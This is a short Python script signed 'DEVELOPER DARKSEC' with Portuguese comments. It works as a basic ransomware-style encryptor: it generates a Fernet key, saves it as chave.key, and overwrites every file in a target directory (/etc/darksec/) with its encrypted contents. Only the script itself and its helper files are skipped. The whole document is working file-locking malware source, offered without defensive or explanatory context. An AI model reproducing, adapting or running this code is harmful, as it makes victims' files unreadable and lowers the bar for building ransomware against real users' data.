#!/usr/bin/env python3
#DEVELOPER DARKSEC
#=======================================
import os
from cryptography.fernet import Fernet
#======================================

#DIRETORIO ALVO:

diretorio_alvo = "/etc/darksec/"

os.chdir(diretorio_alvo)

# ENCRIPTANDO DADOS
files = []

for file in os.listdir():
	if file == "auxiliary.py" or file == "chave.key" or file == "decrypted.py":
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open("chave.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		content = thefile.read()
	content_encrypted = Fernet(key).encrypt(content)
	with open(file, "wb") as thefile:
		thefile.write(content_encrypted)
